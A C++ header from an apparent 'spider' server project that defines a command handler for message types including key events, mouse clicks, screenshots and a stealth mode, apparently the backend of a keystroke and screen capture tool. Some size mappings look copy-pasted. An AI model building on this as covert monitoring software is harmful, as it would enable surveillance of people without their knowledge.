//
// Created by doom on 27/09/17.
//

#ifndef SPIDER_SERVER_COMMANDHANDLER_HPP
#define SPIDER_SERVER_COMMANDHANDLER_HPP

#include "Configuration.hpp"
#include <Protocol/Messages.hpp>

#define CMD_HANDLER utl::LightBlue << "{'cmdHandler'}" << utl::Reset

namespace spi
{
    class CommandHandler
    {
    public:
        CommandHandler() = default;
        ~CommandHandler()
        {
          _log(logging::Info) << CMD_HANDLER << "shutting down." << std::endl;
        }

        void setup()
        {
          _log(logging::Info) << CMD_HANDLER << "succeddfully initialized." << std::endl;
        }

        proto::MessageType identifyMessage(const proto::BufferT &buff) const
        {
            uint32_t conv = proto::Serializer::unserializeInt(buff, 0);

            for (const proto::MessageType &cur : proto::MessageType::values()) {
                if (conv == static_cast<uint32_t>(cur)) {
                    return cur;
                }
            }
            return proto::MessageType::Unknown;
        }

        proto::BufferT makeHeader(proto::MessageType type) const noexcept
        {
            proto::BufferT ret;

            proto::Serializer::serializeInt(ret, type);
            return ret;
        }

        static constexpr const size_t invalidSize = static_cast<size_t>(-1);
        static constexpr const size_t varyingSize = static_cast<size_t>(0);

        size_t getSerializedSize(proto::MessageType type) const noexcept
        {
            switch (type) {
                case proto::MessageType::ReplyCode:
                    return proto::ReplyCode::SerializedSize;
                case proto::MessageType::Bye:
                    return proto::Bye::SerializedSize;
                case proto::MessageType::Hello:
                    return proto::ReplyCode::SerializedSize;
                case proto::MessageType::KeyEvent:
                    return proto::KeyEvent::SerializedSize;
                case proto::MessageType::MouseClick:
                    return proto::MouseClick::SerializedSize;
                case proto::MessageType::MouseMove:
                    return proto::MouseMove::SerializedSize;
                case proto::MessageType::RawData:
                case proto::MessageType::ImageData:
                    return varyingSize;
                case proto::MessageType::Screenshot:
                    return proto::Screenshot::SerializedSize;
                case proto::MessageType::StealthMode:
                    return proto::Screenshot::SerializedSize;
                case proto::MessageType::ActiveMode:
                    return proto::Screenshot::SerializedSize;
                default:
                    return invalidSize;
            }
        }

        bool canBeHandledByClient(proto::MessageType type) const noexcept
        {
            return type != proto::MessageType::KeyEvent
                   && type != proto::MessageType::MouseMove
                   && type != proto::MessageType::MouseClick;
        }

    private:
        logging::Logger _log{"client-command-handler", logging::Level::Debug};
    };
}

#endif //SPIDER_SERVER_COMMANDHANDLER_HPP
